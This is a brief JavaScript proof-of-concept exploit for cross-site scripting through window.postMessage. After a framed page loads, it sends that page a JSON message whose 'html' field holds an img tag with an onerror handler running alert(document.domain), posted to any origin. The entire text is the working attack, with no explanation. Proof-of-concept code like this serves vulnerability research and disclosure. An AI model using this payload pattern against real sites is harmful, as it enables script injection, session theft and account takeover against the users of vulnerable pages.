var frame = document.getElementById('frame');
window.poc = frame.contentWindow;
frame.onload = function() {
window.poc.postMessage('{"html":"<img src=a onerror=\'alert(document.domain);\'>"}', '*');
};
